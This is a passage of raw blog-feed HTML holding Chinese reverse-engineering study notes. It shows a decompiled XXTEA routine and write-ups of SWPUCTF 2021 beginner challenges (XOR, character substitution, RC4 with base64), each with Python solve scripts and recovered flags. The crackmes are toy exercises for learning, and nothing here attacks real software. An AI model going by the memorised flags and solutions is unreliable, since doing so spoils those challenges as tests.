class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v19 <span class="token operator">=</span> <span class="token operator">-</span>a2<span class="token punctuation">;</span>      v12 <span class="token operator">=</span> <span class="token number">52</span> <span class="token operator">/</span> v19 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span>      v16 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1640531527</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">52</span> <span class="token operator">/</span> v19 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v18 <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>      <span class="token keyword">do</span>      <span class="token punctuation">&#123;</span>        v10 <span class="token operator">=</span> <span class="token punctuation">(</span>v16 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> v19 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          v7 <span class="token operator">=</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>             <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v10 <span class="token operator">^</span> i <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v18 <span class="token operator">^</span> v16<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v18 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                                   <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v18<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>          v18 <span class="token operator">=</span> v7<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        v8 <span class="token operator">=</span> <span class="token operator">*</span>a1           <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v19 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v10<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v18 <span class="token operator">^</span> v16<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>v19 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v18 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                         <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v18<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v19 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span>a1 <span class="token operator">=</span> v8<span class="token punctuation">;</span>        v18 <span class="token operator">=</span> v8<span class="token punctuation">;</span>        v16 <span class="token operator">+=</span> <span class="token number">1640531527</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> <span class="token operator">--</span>v12<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> v12 <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    v11 <span class="token operator">=</span> <span class="token number">52</span> <span class="token operator">/</span> a2 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span>    v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v17 <span class="token operator">=</span> a1<span class="token punctuation">[</span>a2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      v15 <span class="token operator">-=</span> <span class="token number">0x61C88647</span><span class="token punctuation">;</span>      v9 <span class="token operator">=</span> <span class="token punctuation">(</span>v15 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> a2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v17 <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v9 <span class="token operator">^</span> j <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> v15<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v17<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                               <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v17 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> a1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        a1<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v4 <span class="token operator">+</span> v5<span class="token punctuation">;</span>        v17 <span class="token operator">=</span> v4 <span class="token operator">+</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v17 <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v9 <span class="token operator">^</span> j <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>a1 <span class="token operator">^</span> v15<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v17<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">*</span>a1 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                        <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v17 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token operator">+</span> a1<span class="token punctuation">[</span>a2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span>a2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>      v17 <span class="token operator">=</span> v6<span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token operator">--</span>v11<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>常量如果不确定的话，可以用IDA的插件findcrypt进行识别</li><li>见到移位+异或这种组合运算可以初步判断是tea系列算法</li><li>如果针对于每轮的轮数有不同的算法的话，可以确定是xxtea算法。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse刷题</title>
      <link href="/2024/02/08/Reverse%E5%88%B7%E9%A2%98/"/>
      <url>/2024/02/08/Reverse%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="reverse刷题"><a class="markdownIt-Anchor" href="#reverse刷题"></a> Reverse刷题</h1><h2 id="swpuctf-2021-新生赛简简单单的逻辑"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛简简单单的逻辑"></a> [SWPUCTF 2021 新生赛]简简单单的逻辑</h2><h3 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">```<span class="token comment">#方法1 爆破  只有256个数字</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span>result <span class="token operator">=</span> <span class="token string">''</span>key2<span class="token operator">=</span><span class="token string">'bcfba4d0038d48bd4b00f82796d393dfec'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        char<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        <span class="token keyword">if</span> key2<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span>char            result<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">```flag <span class="token operator">=</span> <span class="token string">''</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token comment"># for i in range(len(list)):</span><span class="token comment">#     key = (list[i]>>4)+((list[i] &amp; 0xf)&lt;&lt;4)</span><span class="token comment">#     result += str(hex(ord(flag[i])^key))[2:].zfill(2)</span><span class="token comment"># print(result)</span><span class="token comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span>result2<span class="token operator">=</span><span class="token string">'bcfba4d0038d48bd4b00f82796d393dfec'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span>    char<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>result2<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span>    flag<span class="token operator">+=</span>char<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛re1"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛re1"></a> [SWPUCTF 2021 新生赛]re1</h2><h3 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span>先查壳，发现无壳，直接丢进ida分析<span class="token number">2.</span>``` c<span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>char Str2<span class="token punctuation">[</span><span class="token number">1008</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>60h<span class="token punctuation">]</span> BYREFchar Str1<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>410h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>390h<span class="token punctuation">]</span> BYREF<span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>7FCh<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>77Ch<span class="token punctuation">]</span>_main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>strcpy<span class="token punctuation">(</span>Str2<span class="token punctuation">,</span> “<span class="token punctuation">&#123;</span>34sy_r3v3rs3<span class="token punctuation">&#125;</span>”<span class="token punctuation">)</span><span class="token punctuation">;</span>printf<span class="token punctuation">(</span>“please put your flag<span class="token punctuation">:</span>”<span class="token punctuation">)</span><span class="token punctuation">;</span>scanf<span class="token punctuation">(</span>“<span class="token operator">%</span>s”<span class="token punctuation">,</span> Str1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">665</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">101</span> <span class="token punctuation">)</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">665</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">97</span> <span class="token punctuation">)</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> strcmp<span class="token punctuation">(</span>Str1<span class="token punctuation">,</span> Str2<span class="token punctuation">)</span> <span class="token punctuation">)</span>printf<span class="token punctuation">(</span>“you are wrong<span class="token punctuation">,</span>see again!”<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span>printf<span class="token punctuation">(</span>“you are right!”<span class="token punctuation">)</span><span class="token punctuation">;</span>system<span class="token punctuation">(</span>“pause”<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token number">2.</span>发现只是简单的字符替换，编写脚本即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&#123;34sy_r3v3rs3&#125;'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛"></a> [SWPUCTF 2021 新生赛]</h2><h3 id="题目描述-3"><a class="markdownIt-Anchor" href="#题目描述-3"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>parsekey <span class="token operator">=</span> <span class="token string">"HereIsFlagggg"</span>flag <span class="token operator">=</span> <span class="token string">"xxxxxxxxxxxxxxxxxxx"</span>s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> s <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    k <span class="token operator">=</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>crypt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>enc <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>crypt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>enc <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token comment"># enc = %C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA</span><span aria-hidden="true" 